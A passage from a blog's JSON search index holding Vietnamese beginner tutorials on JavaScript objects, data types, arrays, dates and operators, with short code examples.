{\u0026#34;ten\u0026#34;:\u0026#34;Tèo\u0026#34;,\u0026#34;tuoi\u0026#34;:15} let obj = JSON.parse(jsonStr); console.log(obj.ten); // In: Tèo Kết luận và mẹo sử dụng # Đối tượng giúp tổ chức dữ liệu gọn gàng, như một túi đồ chứa nhiều thông tin liên quan. Dùng phương thức để thêm hành vi, prototype để chia sẻ hành vi. Sao chép sâu khi cần tách biệt đối tượng. Mẹo: Đặt tên thuộc tính rõ ràng (như ten thay vì t). Hạn chế thuộc tính lồng sâu để dễ quản lý. Kiểm tra thuộc tính trước khi truy cập (if (obj.ten) ...). Dùng class (ES6) cho các dự án lớn, dễ bảo trì. Flowchart tổng thể:\n[ Dữ liệu ] --\u0026gt; Đối tượng { ten, tuoi, lop }\r|\r|--\u0026gt; Thuộc tính (truy cập: .ten, [\u0026#34;ten\u0026#34;])\r|--\u0026gt; Phương thức (hành vi: gioiThieu())\r|--\u0026gt; Prototype (chia sẻ: HocSinh.prototype.gioiThieu)\r|--\u0026gt; JSON (chuyển đổi: JSON.stringify, JSON.parse) Tài liệu tham khảo # MDN Web Docs: Objects Eloquent JavaScript: Data Structures JavaScript.info: Objects ","date":"15 October 2025","permalink":"http://localhost:1313/posts/object-trong-js/","section":"Posts","summary":"","title":"Hiểu Biết Đối Tượng Trong JavaScrip"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/javascript/","section":"Tags","summary":"","title":"Javascript"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/ki%E1%BB%83u-d%E1%BB%AF-li%E1%BB%87u/","section":"Tags","summary":"","title":"Kiểu Dữ Liệu"},{"content":"A. Kiểu Dữ Liệu #\rTrong JavaScript, có 6 kiểu dữ liệu cơ bản:\nNumber Boolean String Null Undefined Object Mặc dù JavaScript là ngôn ngữ weak type (kiểu yếu), không có nghĩa là nó không có khái niệm kiểu dữ liệu. JavaScript không yêu cầu chỉ định rõ ràng kiểu dữ liệu và có khả năng ép kiểu linh hoạt.\nKiểu Nguyên Thủy (Primitive Types) #Năm kiểu đầu (Number, Boolean, String, Null, Undefined) được gọi là primitive types. Chúng chỉ chứa dữ liệu thuần túy, ví dụ:\nlet x = 10; let s = \u0026#34;Hello\u0026#34;; let z = true; Các kiểu primitive có thể sử dụng method và property như object nhờ cơ chế wrapper. Khi gọi method/property, JavaScript tạm thời biến đổi primitive thành object:\nlet x = new Number(10); let s = new String(\u0026#34;Hello\u0026#34;); let z = new Boolean(true); Tuy nhiên, tránh sử dụng cách này vì nó gây rối, dài dòng và có thể dẫn đến lỗi so sánh (luôn trả về false do so sánh địa chỉ). Thay vào đó, dùng valueOf() để lấy giá trị primitive từ wrapper.\nKiểu Object #Kiểu object chứa thuộc tính (property) và phương thức (method), được khởi tạo bằng new Object() hoặc cú pháp ngắn gọn {}:\nlet obj = new Object(); let obj2 = { ten: \u0026#34;Nguyen Van A\u0026#34;, tuoi: 25, }; Từ object, ta có các biến thể như mảng (array), function, Date, v.v.\nB. Number #1. Tổng Quan #Number dùng cho cả số nguyên và số thực, luôn có dấu (signed). Kiểu được xác định dựa trên giá trị gán:\nlet a = 5, b = 2.5; // Nhiều biến cùng dòng let c = 12e-3; // Dạng khoa học let d = 0.25; // Rút gọn 0.25 let e = 10; // Viết nhiều dòng Số có thể viết dạng hexa (0xff) hoặc octal (017), nhưng tránh bắt đầu bằng 0 trừ khi hiểu rõ.\n2. Toán Tử #Toán tử trong JS giống các ngôn ngữ khác, từ ES6 có thêm ** (lũy thừa). Phép cộng đặc biệt khi kết hợp number và string:\nlet x = 5; let y = \u0026#34;Hi \u0026#34; + x; // y = \u0026#34;Hi 5\u0026#34; Nhân chia giữa string số sẽ tự ép kiểu:\nlet s1 = \u0026#34;2000\u0026#34;; let s2 = \u0026#34;10\u0026#34;; let result = s1 / s2; // result = 200 3. Giá Trị Đặc Biệt # NaN: Kết quả phép tính không hợp lệ (ví dụ: 100 / \u0026quot;Apple\u0026quot;), kiểm tra bằng isNaN(). Infinity: Kết quả quá lớn hoặc chia cho 0, kiểm tra bằng isFinite(). 4. Phương Thức Number #Phương thức như toString() có thể gọi trực tiếp từ giá trị:\nlet x = 123; x.toString(); // \u0026#34;123\u0026#34; (100 + 23).toString(); // \u0026#34;123\u0026#34; 5. Thuộc Tính Number #Truy cập qua Number, không qua biến:\nNumber.MAX_VALUE; // Ok 123.MAX_VALUE; // Sai C. Boolean #1. Tổng Quan #Boolean lưu trữ true hoặc false, dùng trong điều kiện:\nlet b = false; if (b) console.log(\u0026#34;Đúng\u0026#34;); 2. Truthy \u0026amp; Falsy # Falsy: 0, false, \u0026quot;\u0026quot;, null, undefined, NaN. Truthy: Ngược lại, bao gồm Infinity, -Infinity. Ép kiểu: !!x biến thành Boolean. let x = 10, y = 0; console.log(!!x); // true console.log(!!y); // false 3. Thuộc Tính \u0026amp; Phương Thức #Chỉ có toString() và valueOf().\n4. Mẹo Boolean # Shorthand: \u0026lt;condition\u0026gt; \u0026amp;\u0026amp; \u0026lt;statement\u0026gt; thay cho if. Default Value: fileName = fileName || \u0026quot;Noname.txt\u0026quot;; thay cho kiểm tra rỗng. D. String #\r1. Tổng Quan #String lưu dữ liệu text, dùng nháy đơn hoặc kép:\nlet s1 = \u0026#34;I\u0026#39;m Vu\u0026#34;; // Nháy kép let s2 = \u0026#39;He said \u0026#34;ABC\u0026#34;\u0026#39;; // Nháy đơn Truy cập ngoài phạm vi trả về undefined. Chuỗi là mảng ký tự, index từ 0.\n2. Thuộc Tính \u0026amp; Phương Thức # Length: s.length (không dùng ()). Truy Cập Ký Tự: s[0], s.charAt(1), s.charCodeAt(2). Nối Chuỗi: s1.concat(\u0026quot; \u0026quot;, s2). Trim: s.trim() loại bỏ khoảng trắng. Chuyển Hoa/Thường: s.toUpperCase(), s.toLowerCase(). Tìm Vị Trí: s.indexOf(\u0026quot;nh\u0026quot;), s.lastIndexOf(\u0026quot;nh\u0026quot;), s.search(/anh/i). Trích Xuất: s.substring(0, 3), s.substr(4, 3), s.slice(-3). Thay Thế: s.replace(\u0026quot;anh\u0026quot;, \u0026quot;em\u0026quot;). Tách Chuỗi: s.split(\u0026quot; \u0026quot;), s.split(/ {1,}/). E. Array 1 #1. Tổng Quan #Array lưu nhiều giá trị, truy cập bằng index (từ 0):\nlet primes = [2, 3, 5, 7]; let third_prime = primes[2]; // 5 Array cho phép nhiều kiểu dữ liệu, không giới hạn số phần tử.\n2. Array và Object #Array là object, typeof primes trả về object. Có thể dùng constructor new Array(2, 3, 5, 7) nhưng nên dùng [].\n3. Thuộc Tính \u0026amp; Phương Thức # Length: primes.length. Thêm/Phổ: push(), unshift(), pop(), shift(). Xóa: delete primes[2]. F. Array 2 #1. Phương Thức 2 # Concat: a.concat(b). Splice: primes.splice(2, 1, 5, 7). Slice: primes.slice(0, 4). Join: primes.join(\u0026quot;, \u0026quot;). Find: a.includes(2), a.indexOf(2). 2. Constructor Methods # isArray: Array.isArray(primes). of: Array.of(1, 2, 3). from: Array.from(a, x =\u0026gt; x * 2). 3. Sắp Xếp # Sort: primes.sort((a, b) =\u0026gt; a - b). 4. Tìm Max/Min # Math.max.apply(null, primes). G. Array Iteration Methods #1. Tổng Quan #Phương thức lặp như forEach(), map(), filter(), v.v., dùng callback function.\n2. Phương Thức Lặp # forEach: a.forEach((value, index) =\u0026gt; console.log(value)). Map: b = a.map(x =\u0026gt; x * 2). Filter: c = primes.filter(x =\u0026gt; x \u0026lt; 10). Every/Some: primes.every(x =\u0026gt; x \u0026gt; 0), primes.some(x =\u0026gt; x \u0026gt; 10). Find: a.findIndex(x =\u0026gt; x \u0026gt; 10). Reduce: sum = a.reduce((prev, curr) =\u0026gt; prev + curr). 3. Arrow Function #Sử dụng =\u0026gt; để viết ngắn gọn:\nlet b = a.map((x) =\u0026gt; x * 2); H. Date #1. Đối Tượng Date #Tạo Date với các cách:\nHiện Tại: let current = new Date(); Tùy Chỉnh: let birthday = new Date(2001, 7, 27); Miliseconds: let root = new Date(0); Chuỗi: let birthday = new Date(\u0026quot;August 27, 2001\u0026quot;); 2. Định Dạng Date # ISO: 2001-08-27, 2001-08-27T06:30:00Z. Long Date: August 27 2001. Short Date: 08/27/2001. 3. Get/Set Methods # Get: d.getFullYear(), d.getMonth(). Set: d.setMonth(7). 4. Thao Tác Date # Hiển Thị: d.toString(). Miliseconds: Date.parse(\u0026quot;August 27, 2001\u0026quot;). So Sánh: d1.getTime() \u0026gt; d2.getTime(). Cộng Ngày: tomorrow.setDate(today.getDate() + 1). ","date":"15 October 2025","permalink":"http://localhost:1313/posts/kieu-du-lieu-cua/","section":"Posts","summary":"","title":"Kiểu Dữ Liệu trong JavaScript"},{"content":"","date":null,"permalink":"http://localhost:1313/categories/l%E1%BA%ADp-tr%C3%ACnh/","section":"Categories","summary":"","title":"Lập Trình"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/l%E1%BA%ADp-tr%C3%ACnh-web/","section":"Tags","summary":"","title":"Lập Trình Web"},{"content":"","date":null,"permalink":"http://localhost:1313/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":null,"permalink":"http://localhost:1313/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"1. Toán Tử #\r1.1 Toán tử là gì? #Toán tử trong JavaScript #Toán tử là ký hiệu hoặc từ khóa thực hiện hành động trên toán hạng (giá trị hoặc biến). Ví dụ: = là toán tử gán, typeof kiểm tra kiểu.\nPhân loại: #Theo số lượng toán hạng: Đơn ngôi (!a), Nhị phân (a + b), Ba ngôi (condition ? a : b). Theo vị trí: Tiền tố (++a), Hậu tố (a++), Trung tố (a + b). Theo chức năng: Gán (=), Số học (+, -), Logic (\u0026amp;\u0026amp;, ||), So sánh (==, ===), Điều kiện (?:).\nLưu ý: Ký hiệu như + có thể là phép cộng số hoặc nối chuỗi tùy ngữ cảnh.\n1.2 Toán tử gán #Hãy bắt đầu với các toán tử gán. Trong nhóm này, có các toán tử cho phép gán giá trị cho các biến và hằng số. Toán tử gán cơ bản là dấu bằng =, mà chúng ta đã thấy nhiều lần trong các ví dụ. Toán tử này gán giá trị của toán hạng bên phải cho toán hạng bên trái.\nconst name = \u0026#34;Alice\u0026#34;; console.log(name); // -\u0026gt; Alice Nếu có nhiều toán tử gán xuất hiện trong một chuỗi, thứ tự từ phải sang trái sẽ được áp dụng. Do đó, chuỗi:\nlet year = 2050; let newYear = year = 2051; có nghĩa giống như: let year = 2050; year = 2051; let newYear = year; Ngoài toán tử gán cơ bản, còn có các toán tử gán liên quan đến toán tử số học, logic và chuỗi. Chúng ta sẽ quay lại với chúng khi thảo luận về các loại toán tử khác.\n1.3 Toán tử số học #Toán tử số học dùng để thực hiện các phép tính trên giá trị số hoặc biến.\nNgoại trừ phép cộng (+), tất cả các toán tử khác sẽ tự chuyển đổi toán hạng sang kiểu Number trước khi tính.\nRiêng + sẽ:\nNếu một trong hai toán hạng là chuỗi (String) → nối chuỗi. Nếu đều là số → thực hiện phép cộng số học. Thứ tự ưu tiên trong JavaScript giống toán học, nên dùng ngoặc đơn để đảm bảo rõ ràng.\nconsole.log(2 + 2 * 2); // -\u0026gt; 6 console.log(2 + 2 * 2); // -\u0026gt; 6 console.log((2 + 2) * 2); // -\u0026gt; 8 Các toán tử số học nhị phân cơ bản là phép cộng +, phép trừ -, phép nhân *, phép chia /, phần dư của phép chia % và mũ **. Hoạt động của chúng tương tự như những gì chúng ta biết từ toán học và cách dễ nhất để theo dõi chúng là sử dụng một ví dụ:\nconst x = 5; const y = 2; console.log(\u0026#34;addition: \u0026#34;, x + y); // -\u0026gt; 7 console.log(\u0026#34;subtraction: \u0026#34;, x - y); // -\u0026gt; 3 console.log(\u0026#34;multiplication: \u0026#34;, x * y); // -\u0026gt; 10 console.log(\u0026#34;division: \u0026#34;, x / y); // -\u0026gt; 2.5 console.log(\u0026#34;division remainder :\u0026#34;, x % y); // -\u0026gt; 1 console.log(\u0026#34;exponent: \u0026#34;, x ** y); // -\u0026gt; 25 1.4 Toán tử số học một ngôi #Ngoài ra còn có một số toán tử số học đơn ngôi (hoạt động trên một toán hạng duy nhất). Trong số đó có phép cộng + và trừ - người vận hành.\nCả hai toán tử đều chuyển đổi toán hạng thành kiểu Số, trong khi toán tử trừ còn phủ định nó.\nlet str = \u0026#34;123\u0026#34;; let n1 = +str; let n2 = -str; let n3 = -n2; let n4 = +\u0026#34;abcd\u0026#34;; console.log(`${str} : ${typeof str}`); // -\u0026gt; 123 : string console.log(`\\${n1} : ${typeof n1}`); // -\u0026gt; 123 : number console.log(`${n2} : ${typeof n2}`); // -\u0026gt; -123 : number console.log(`${n3} : ${typeof n3}`); // -\u0026gt; 123 : number console.log(`${n4} : ${typeof n4}`); // -\u0026gt; NaN : number 1.5 Toán tử tăng và giảm một ngôi #Trong số các toán tử số học, chúng ta cũng có thể sử dụng phép gia số đơn ++ và giảm -- Toán tử, ở cả phiên bản tiền tố và hậu tố. Chúng cho phép chúng ta tăng (tăng) hoặc giảm (giảm) giá trị của toán hạng đi\nCác toán tử này ở dạng hậu tố (tức là toán tử nằm bên phải toán hạng) thực hiện phép toán bằng cách thay đổi giá trị của biến, nhưng trả về giá trị trước khi thay đổi. Phiên bản tiền tố của toán tử (tức là toán tử được đặt trước toán hạng) thực hiện phép toán và trả về giá trị mới.\nBảng điều khiển phần cuối đồng bộ hóa\nĐiều này xảy ra vì dòng mã:\nconsole.log(n1++); được hiểu là:\nconsole.log(n1); n1 = n1 + 1; trong khi dòng:\nconsole.log(++n1); có nghĩa giống như:\nn1 = n1 + 1; console.log(n1); Hãy nhớ rằng kiểu Số là kiểu dấu phẩy động, nghĩa là kết quả của một số phép toán có thể không chính xác.\nconsole.log(0.2 + 0.1); // 0.30000000000000004 console.log(0.2 * 0.1); // 0.020000000000000004 console.log(0.3 / 0.1); // 2.9999999999999996 Đây là những hiện vật của phép tính số học dấu phẩy động. Số này sẽ chính xác với các số nguyên lên đến 252, nhưng phân số có thể không chính xác bằng, vì nhiều phân số không thể biểu diễn trực tiếp ở định dạng nhị phân. Chúng ta sẽ thảo luận về cách giảm thiểu vấn đề này ngay khi giới thiệu các toán tử so sánh.\n1.6 Toán tử gán hợp chất #Các toán tử số học nhị phân có thể được kết hợp với toán tử gán , tạo ra phép gán cộng +=, phép trừ -=, phép nhân *= , phép chia /=, lấy dư %= và mũ **= .\nMỗi toán tử này lấy một giá trị từ biến cần gán (toán hạng bên trái) và sửa đổi nó bằng cách thực hiện phép toán số học sử dụng giá trị toán hạng bên phải. Giá trị mới được gán cho toán hạng bên trái. Ví dụ, đoạn mã dưới đây:\nx += 100; có thể được viết dưới dạng:\nx = x + 100; Do đó, sẽ không khó để hiểu cách hoạt động của ví dụ sau:\nlet x = 10; x += 2; console.log(x); // -\u0026gt; 12 x -= 4; console.log(x); // -\u0026gt; 8 x *= 3; console.log(x); // -\u0026gt; 24 x = 6; console.log(x); // -\u0026gt; 4 x **= 3; console.log(x); // -\u0026gt; 64 x %= 10; console.log(x); // -\u0026gt; 4 1.7 Toán tử logic #Các toán tử logic hoạt động với các giá trị kiểu Boolean (true hoặc false ). Hiện tại, chúng ta có thể giả định rằng chúng hoạt động trên các toán hạng thuộc kiểu này và chỉ trả về các giá trị thuộc kiểu này. JavaScript cung cấp cho chúng ta ba toán tử như vậy:\nmột phép nối, tức là phép logic AND (\u0026amp;\u0026amp; biểu tượng)\nmột giải pháp thay thế, tức là logic OR (ký hiệu ||)\nmột phủ định, tức là logic NOT (ký hiệu !)\nÝ nghĩa của chúng cũng giống như trong logic toán học, và nếu bạn không chắc chúng hoạt động như thế nào, cách dễ nhất là giải thích chúng dựa trên các câu logic.\nHãy bắt đầu với phép nối. Đây là một toán tử nhị phân trả về giá trị true nếu cả hai toán hạng đều đúng. Sử dụng các câu logic, chúng ta có thể hình dung một câu bao gồm hai mệnh đề đơn giản được kết nối bằng toán tử AND, ví dụ:\nLondon là một thành phố VÀ London nằm ở Vương quốc Anh.\nCả hai câu đều đúng trong trường hợp này, và sau khi kết hợp chúng với AND, một câu cũng đúng sẽ được tạo ra. Nếu bất kỳ câu nào trong số này sai (hoặc cả hai đều sai), thì toàn bộ câu cũng sẽ sai, ví dụ:\nLondon là một thành phố VÀ London nằm ở Iceland.\nTrong mã JavaScript, nó trông đơn giản như thế này:\nconsole.log(true \u0026amp;\u0026amp; true); // -\u0026gt; true console.log(true \u0026amp;\u0026amp; false); // -\u0026gt; false console.log(false \u0026amp;\u0026amp; true); // -\u0026gt; false console.log(false \u0026amp;\u0026amp; false); // -\u0026gt; false Trong trường hợp một toán tử thay thế cũng là toán tử nhị phân, chỉ cần một trong hai toán hạng đúng là đủ để toán tử trả về giá trị đúng. Quay lại ví dụ về các câu logic, hãy sử dụng một câu được tạo thành từ hai câu lệnh được kết nối bằng toán tử OR, ví dụ:\nLondon là một thành phố HOẶC London nằm ở Iceland.\nCâu này có thể trông không được hùng hồn hay hợp lý lắm, nhưng xét về mặt logic thì nó khá chính xác. Chỉ cần một trong hai mệnh đề đúng là đủ, thì cả câu cũng đúng. Nếu cả hai mệnh đề đều sai, thì câu cũng sẽ sai, ví dụ:\nLondon là một ngôi làng HOẶC London nằm ở Iceland.\nHãy kiểm tra xem nó trông như thế nào trong JavaScript:\nconsole.log(true || true); // -\u0026gt; true console.log(true || false); // -\u0026gt; true console.log(false || true); // -\u0026gt; true console.log(false || false); // -\u0026gt; false Toán tử phủ định là một toán tử đơn, và nó thay đổi giá trị logic của toán hạng thành giá trị đối lập của nó, tức là từ false thành true, và từ true thành false. Sử dụng các câu logic, ta có thể biểu diễn nó với phép phủ định NOT. Hãy lấy ví dụ một câu đơn giản đúng:\nLondon là một thành phố.\nBằng cách thêm phủ định vào nó, chúng ta thay đổi giá trị của nó thành sai:\nLondon KHÔNG phải là một thành phố.\nTương tự như vậy, nó sẽ hoạt động theo chiều ngược lại, biến một câu sai thành một câu đúng. Trong đoạn mã, nó sẽ trông thậm chí còn đơn giản hơn:\nconsole.log(!true); // -\u0026gt; false console.log(!false); // -\u0026gt; true Tất nhiên, chúng ta có thể kết nối bao nhiêu toán tử này tùy thích, tạo ra những \u0026ldquo;câu\u0026rdquo; phức tạp hơn. Cũng như trường hợp các toán tử số học, trình tự các hành động được xác định ở đây. Ưu tiên cao nhất là phủ định !, sau đó kết hợp \u0026amp;\u0026amp; và cuối cùng là giải pháp thay thế ||. Tất nhiên thứ tự ưu tiên có thể được thay đổi bằng cách sử dụng dấu ngoặc đơn.\nconst a = false; const b = true; const c = false; const d = true; console.log((a \u0026amp;\u0026amp; b \u0026amp;\u0026amp; c) || d); // -\u0026gt; true console.log(a \u0026amp;\u0026amp; b \u0026amp;\u0026amp; (c || d)); // -\u0026gt; false 1.8 Toán tử logic và giá trị không phải Boolean #Miễn là toán hạng thuộc kiểu Boolean, chúng ta có thể dễ dàng thấy kết quả trả về. Tuy nhiên, các toán tử này cũng có thể được sử dụng với các kiểu dữ liệu khác nhau. Trường hợp dễ nhất là logic NOT. Đầu tiên, toán hạng được chuyển đổi tạm thời thành giá trị Boolean (theo các quy tắc đã giải thích trong chương trước) và chỉ sau đó mới được xử lý bằng thao tác toán tử thích hợp (tức là giá trị true được chuyển đổi thành false và ngược lại). Do đó, toán tử NOT sẽ luôn trả về false hoặc true. Thông thường, phép phủ định kép được sử dụng để chuyển đổi bất kỳ kiểu dữ liệu nào sang Boolean.\nlet nr = 0; let year = 1970; let name = \u0026#34;Alice\u0026#34;; let empty = \u0026#34;\u0026#34;; console.log(!nr); // -\u0026gt; true console.log(!year); // -\u0026gt; false console.log(!name); // -\u0026gt; false console.log(!empty); // -\u0026gt; true console.log(!!nr); // -\u0026gt; false console.log(!!name); // -\u0026gt; true Điều này hơi khác với các toán tử logic nhị phân (ví dụ AND và OR). Chúng không trả về giá trị Boolean. Thực tế, chúng trả về toán hạng thứ nhất hoặc thứ hai của toán tử đó. Toán tử AND sẽ trả về toán hạng thứ nhất nếu nó được đánh giá là false, và toán hạng thứ hai nếu ngược lại. Toán tử OR sẽ trả về toán hạng thứ nhất nếu nó được đánh giá là true, và toán hạng thứ hai nếu ngược lại. Đánh giá đơn giản là một nỗ lực để chuyển đổi một toán hạng thành giá trị Boolean (một lần nữa, theo các quy tắc đã học ở chương trước).\nconsole.log(true \u0026amp;\u0026amp; 1991); // -\u0026gt; 1991 console.log(false \u0026amp;\u0026amp; 1991); // -\u0026gt; false console.log(2 \u0026amp;\u0026amp; 5); // -\u0026gt; 5 console.log(0 \u0026amp;\u0026amp; 5); // -\u0026gt; 0 console.log(\u0026#34;Alice\u0026#34; \u0026amp;\u0026amp; \u0026#34;Bob\u0026#34;); // -\u0026gt; Bob console.log(\u0026#34;\u0026#34; \u0026amp;\u0026amp; \u0026#34;Bob\u0026#34;); // -\u0026gt; empty string console.log(true || 1991); // -\u0026gt; true console.log(false || 1991); // -\u0026gt; 1991 console.log(2 || 5); // -\u0026gt; 2 console.log(0 || 5); // -\u0026gt; 5 console.log(\u0026#34;Alice\u0026#34; || \u0026#34;Bob\u0026#34;); // -\u0026gt; Alice console.log(\u0026#34;\u0026#34; || \u0026#34;Bob\u0026#34;); // -\u0026gt; Bob Cả hai toán tử đều sử dụng đánh giá ngắn mạch .\nVì vậy, nếu toán hạng đầu tiên của AND là false , nó sẽ được trả lại và không có kiểm tra nào khác được thực hiện.\nNgược lại, nếu toán hạng đầu tiên của OR là true, nó sẽ được trả về và không có kiểm tra nào khác được thực hiện. Điều này giúp tăng tốc độ thực thi mã, nhưng có một tác dụng phụ có thể thấy trong ví dụ này:\nlet x = 0; let y = 0; console.log(x++ \u0026amp;\u0026amp; y++); // -\u0026gt; 0 console.log(x); // -\u0026gt; 1 console.log(y); // -\u0026gt; y == 0 Hướng dẫn y++ sẽ không bao giờ được thực hiện, điều này có thể gây nhầm lẫn.\nToán tử logic thường được sử dụng cùng với toán tử điều kiện và đặc biệt hữu ích trong các lệnh điều kiện (ra quyết định) và trong vòng lặp (điều kiện kết thúc vòng lặp). Bạn có thể tìm hiểu về ứng dụng thực tế của chúng trong các phần về lệnh điều kiện và vòng lặp vừa được đề cập.\n1.9 Toán tử gán hợp chất #Giống như các toán tử số học, các toán tử logic nhị phân có thể được sử dụng kết hợp với toán tử gán, tạo ra phép gán logic AND \u0026amp;\u0026amp; = và một phép gán OR logic || =.\nCó lẽ bạn sẽ dễ dàng hình dung cách chúng hoạt động. Trong trường hợp toán tử AND, chúng ta có thể kiểm tra bằng ví dụ sau:\nlet a = true; console.log(a); // -\u0026gt; true a \u0026amp;\u0026amp;= false; console.log(a); // -\u0026gt; false Hướng dẫn a \u0026amp;\u0026amp;= false có nghĩa chính xác giống như a = a \u0026amp;\u0026amp; false.\nChúng ta có thể chuẩn bị một ví dụ tương tự cho phép toán OR:\nlet b = false; console.log(b); // -\u0026gt; false b ||= true; console.log(b); // -\u0026gt; true Lần này, hoạt động b ||= true được hiểu là b = b || true.\n2. Chuỗi, so sánh chuỗi và các phép toán khác #2.1 Toán tử chuỗi #Toán tử duy nhất trong nhóm này là phép nối + Toán tử này sẽ chuyển đổi mọi thứ thành String nếu bất kỳ toán hạng nào có kiểu Chuỗi. Cuối cùng, nó sẽ tạo ra một chuỗi ký tự mới, nối toán hạng bên phải vào cuối toán hạng bên trái.\nlet greetings = \u0026#34;Hi\u0026#34;; console.log(greetings + \u0026#34; \u0026#34; + \u0026#34;Alice\u0026#34;); // -\u0026gt; Hi Alice* let sentence = \u0026#34;Happy New Year \u0026#34;; let newSentence = sentence + 10191; console.log(newSentence); // -\u0026gt; Happy New Year 10191* console.log(typeof newSentence); // -\u0026gt; string* Toán tử gán hợp chất #Bạn có thể đoán rằng toán tử này cũng có thể được sử dụng kết hợp với toán tử thay thế. Thao tác của nó rất trực quan nên chúng ta sẽ dừng lại ở một ví dụ đơn giản:\nlet sentence = \u0026#34;Happy New \u0026#34;; sentence += \u0026#34;Year \u0026#34;; sentence += 10191; console.log(sentence); // -\u0026gt; Happy New Year 10191* 2.2 Toán tử so sánh #Toán tử so sánh được sử dụng để kiểm tra sự bằng nhau hay bất bằng nhau của các giá trị. Tất cả các toán tử so sánh đều là nhị phân và đều trả về một giá trị logic biểu diễn kết quả của phép so sánh. true VẬY hoặc false.\nGiống như các toán tử khác, JavaScript sẽ cố gắng chuyển đổi các giá trị đang được so sánh nếu chúng có kiểu dữ liệu khác nhau. Việc kiểm tra tính bằng nhau, hay giá trị nào lớn hơn, bằng cách sử dụng biểu diễn số, là hợp lý, và trong hầu hết các trường hợp, JavaScript sẽ chuyển đổi kiểu dữ liệu thành Số trước khi so sánh. Có hai ngoại lệ cho điều này: chuỗi và toán tử đồng nhất (bằng nhau nghiêm ngặt) . Chuỗi được so sánh char qua char (chính xác từng ký tự Unicode bằng cách sử dụng giá trị của chúng).\nĐể kiểm tra xem các toán hạng có bằng nhau hay không, chúng ta có thể sử dụng toán tử đồng nhất (bằng nhau nghiêm ngặt) === hoặc toán tử bằng ==.\nCách đầu tiên hạn chế hơn và để trả về giá trị true, các toán hạng phải giống hệt nhau (tức là chúng phải bằng nhau và cùng kiểu).\nconsole.log(10 === 5); // -\u0026gt; false console.log(10 === 10); // -\u0026gt; true console.log(10 === 10n); // -\u0026gt; false console.log(10 === \u0026#34;10\u0026#34;); // -\u0026gt; false console.log(\u0026#34;10\u0026#34; === \u0026#34;10\u0026#34;); // -\u0026gt; true console.log(\u0026#34;Alice\u0026#34; === \u0026#34;Bob\u0026#34;); // -\u0026gt; false console.log(0 === false); //-\u0026gt; false console.log(undefined === false); // -\u0026gt; false Toán tử bằng yêu cầu chúng chỉ bằng nhau và kiểu dữ liệu của chúng không được so sánh. Vì vậy, nếu các toán hạng có kiểu dữ liệu khác nhau, trình thông dịch sẽ cố gắng chuyển đổi chúng thành số, ví dụ: False sẽ chuyển đổi thành 0, true ĐẾN 1, không xác định ĐẾN NaN,vô giá trị ĐẾN 0, 10n ĐẾN 10 Và \u0026ldquo;123\u0026rdquo; ĐẾN 123, vân vân.\nLưu ý rằng nếu bất kỳ toán hạng nào có NaN giá trị (hoặc đã được chuyển đổi thành NaN, ví dụ với undefined), toán tử bằng sẽ trả về False.\nconsole.log(10 == 5); // -\u0026gt; false console.log(10 == 10); // -\u0026gt; true console.log(10 == 10n); // -\u0026gt; true console.log(10 == \u0026#34;10\u0026#34;); // -\u0026gt; true console.log(\u0026#34;10\u0026#34; == \u0026#34;10\u0026#34;); // -\u0026gt; true console.log(\u0026#34;Alice\u0026#34; == \u0026#34;Bob\u0026#34;); // -\u0026gt; false console.log(0 == false); // -\u0026gt; true console.log(undefined == false); // -\u0026gt; false console.log(NaN == NaN); // -\u0026gt; false ** Hãy nhớ! Sử dụng toán tử danh tính trừ khi bạn cố ý cho phép so sánh tích cực giữa các kiểu khác nhau. **\nNgoài ra còn có các toán tử bổ sung cho các toán tử vừa trình bày \u0026ndash; toán tử không đồng nhất !== và toán tử bất đẳng thức !=. Sự trở lại đầu tiên true nếu các toán hạng không giống hệt nhau, nói cách khác, chúng bằng nhau nhưng có kiểu khác nhau hoặc chúng chỉ đơn giản là khác nhau. Trả về thứ hai true nếu các toán hạng khác nhau.\nconsole.log(10 !== 5); // -\u0026gt; true console.log(10 !== 10); // -\u0026gt; false console.log(10 !== 10n); // -\u0026gt; true console.log(10 !== \u0026#34;10\u0026#34;); // -\u0026gt; true console.log(\u0026#34;10\u0026#34; !== \u0026#34;10\u0026#34;); // -\u0026gt; false console.log(\u0026#34;Alice\u0026#34; !== \u0026#34;Bob\u0026#34;); // -\u0026gt; true console.log(0 !== false); // -\u0026gt; true console.log(undefined !== false); // -\u0026gt; true console.log(10 != 5); // -\u0026gt; true console.log(10 != 10); // -\u0026gt; false console.log(10 != 10n); // -\u0026gt; false console.log(10 != \u0026#34;10\u0026#34;); // -\u0026gt; false console.log(\u0026#34;10\u0026#34; != \u0026#34;10\u0026#34;); // -\u0026gt; false console.log(\u0026#34;Alice\u0026#34; != \u0026#34;Bob\u0026#34;); // -\u0026gt; true console.log(0 != false); // -\u0026gt; false console.log(undefined != false); // -\u0026gt; true console.log(NaN != NaN); // -\u0026gt; true Chúng tôi cũng có các toán tử cho phép chúng tôi kiểm tra xem một trong các toán hạng có lớn hơn \u0026gt;, nhỏ hơn \u0026lt;, lớn hơn hoặc bằng \u0026gt;= và nhỏ hơn hoặc bằng \u0026lt;=. Các toán tử này có tác dụng với mọi loại toán hạng, nhưng chỉ nên sử dụng chúng trên các số hoặc giá trị có thể chuyển đổi chính xác thành số.\nconsole.log(10 \u0026gt; 100); // -\u0026gt; false console.log(101 \u0026gt; 100); // -\u0026gt; true console.log(101 \u0026gt; \u0026#34;100\u0026#34;); // -\u0026gt; true console.log(101 \u0026lt; 100); // -\u0026gt; false console.log(100n \u0026lt; 102); // -\u0026gt; true console.log(\u0026#34;10\u0026#34; \u0026lt; 20n); // -\u0026gt; true console.log(101 \u0026lt;= 100); // -\u0026gt; false console.log(10 \u0026gt;= 10n); // -\u0026gt; true console.log(\u0026#34;10\u0026#34; \u0026lt;= 20); // -\u0026gt; true Bạn cũng có thể sử dụng chúng để so sánh các chuỗi không biểu diễn số, nhưng thuật toán so sánh này khá phức tạp, và bản thân phép so sánh này không thực sự hữu ích. Để đơn giản hóa, các ký tự riêng lẻ của cả hai chuỗi được kiểm tra ở cùng một vị trí. Giả định rằng giá trị của các ký tự riêng lẻ tương ứng với vị trí của chúng trong bảng chữ cái (chữ b có giá trị cao hơn chữ a). Chữ in hoa có giá trị thấp hơn chữ thường, và chữ số thậm chí còn có giá trị thấp hơn.\nconsole.log(\u0026#34;b\u0026#34; \u0026gt; \u0026#34;a\u0026#34;); // -\u0026gt; true console.log(\u0026#34;a\u0026#34; 